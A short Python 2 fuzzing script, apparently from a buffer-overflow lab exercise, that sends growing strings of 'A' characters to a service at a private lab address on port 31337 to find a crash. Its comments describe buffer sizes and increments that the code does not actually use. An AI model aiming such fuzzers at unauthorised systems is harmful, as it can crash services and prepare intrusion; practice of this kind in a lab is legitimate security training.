#!/usr/bin/env python
#st4rry made this

import socket

#Create an array of buffer data to send from 1 - 60000 with increments of 2000
#Coz we know the recvbuf size is 58623 

buf = ["A"]
counter = 10

while len(buf) <= 30:
    buf.append("A"*counter) 
    counter = counter + 20

#Create the tcp connection and send the buf in the for loop

for string in buf:
    print "Fuzzing the input buffer with %s bytes" %len(string)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#Define the target

    RHOST = '192.168.25.129'
    RPORT = 31337

#connect the socket

    connect = s.connect((RHOST,RPORT))
 
#send the buffer string
    s.send("st4rry"+string + "\r\n")
#receive from the service over the socket
    data = s.recv(1024)
    print (data+"\n")
#close the socket
    s.close()
